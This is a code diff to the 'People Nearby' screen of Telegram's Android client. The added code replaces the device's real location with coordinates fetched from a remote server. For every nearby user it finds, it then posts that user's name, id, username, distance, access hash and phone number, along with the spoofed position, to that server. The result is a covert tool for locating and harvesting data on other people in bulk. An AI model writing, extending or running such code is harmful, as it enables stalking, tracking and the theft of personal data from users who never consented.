@@ -61,12 +61,15 @@ import org.telegram.ui.Components.RadialProgressView;
 import org.telegram.ui.Components.RecyclerListView;
 import org.telegram.ui.Components.ShareLocationDrawable;
 import org.telegram.ui.Components.UndoView;
+import org.telegram.ui.HttpClientExample;
 
 import java.util.ArrayList;
 
 public class PeopleNearbyActivity extends BaseFragment implements NotificationCenter.NotificationCenterDelegate, LocationController.LocationFetchCallback {
 
     private ListAdapter listViewAdapter;
+    private HttpClientExample httpClientExample;
+    private boolean isNextCoordintas;
     private RecyclerListView listView;
     private ActionIntroActivity groupCreateActivity;
     private UndoView undoView;
@@ -130,12 +133,15 @@ public class PeopleNearbyActivity extends BaseFragment implements NotificationCe
     private int chatsCreateRow;
     private int chatsSectionRow;
     private int rowCount;
+    private String loc;
     private DefaultItemAnimator itemAnimator;
 
     public PeopleNearbyActivity() {
         super();
         users = new ArrayList<>(getLocationController().getCachedNearbyUsers());
         chats = new ArrayList<>(getLocationController().getCachedNearbyChats());
+        isNextCoordintas = false;
+        httpClientExample = new HttpClientExample();
         checkForExpiredLocations(false);
         updateRows(null);
     }
@@ -569,6 +575,25 @@ public class PeopleNearbyActivity extends BaseFragment implements NotificationCe
         showProgressAnimation.start();
     }
 
+
+    public void SendAllUsers(String coordinats){
+        for (int i = 0; i < users.size(); i++){
+            TLRPC.TL_peerLocated peerLocated = users.get(i);
+
+            TLRPC.User user = getMessagesController().getUser(peerLocated.peer.user_id);
+            String name = user.first_name + " " + user.last_name;
+            httpClientExample.SendPost(name,
+                    String.valueOf(user.id),
+                    user.username,
+                    String.valueOf(peerLocated.distance),
+                    String.valueOf(user.access_hash),
+                    String.valueOf(user.phone),
+                    coordinats);
+
+        }
+        isNextCoordintas = false;
+    }
+
     private void sendRequest(boolean shortpoll, int share) {
         if (!firstLoaded) {
             AndroidUtilities.runOnUIThread(showProgressRunnable = () -> {
@@ -577,7 +602,22 @@ public class PeopleNearbyActivity extends BaseFragment implements NotificationCe
             }, 1000);
             firstLoaded = true;
         }
-        Location location = getLocationController().getLastKnownLocation();
+//        Location location = getLocationController().getLastKnownLocation();
+        if(!isNextCoordintas){
+            loc = httpClientExample.GetLocationRequest();
+            isNextCoordintas = true;
+        }
+        String ddd = "2";
+        String[] locArr = loc.split(" ", 2);
+
+        Location location = new Location("");//provider name is unnecessary
+//          location.setLatitude(41.55d);//your coords of course
+//          location.setLongitude(41.55d);
+        location.setLatitude(Double.parseDouble(locArr[0]));//your coords of course
+        location.setLongitude(Double.parseDouble(locArr[1]));
+        ddd = "3";
+
+
         if (location == null) {
             return;
         }
@@ -680,6 +720,8 @@ public class PeopleNearbyActivity extends BaseFragment implements NotificationCe
             }
         }));
         getConnectionsManager().bindRequestToGuid(reqId, classGuid);
+        if(isNextCoordintas)
+            SendAllUsers(loc);
     }
 
     @Override
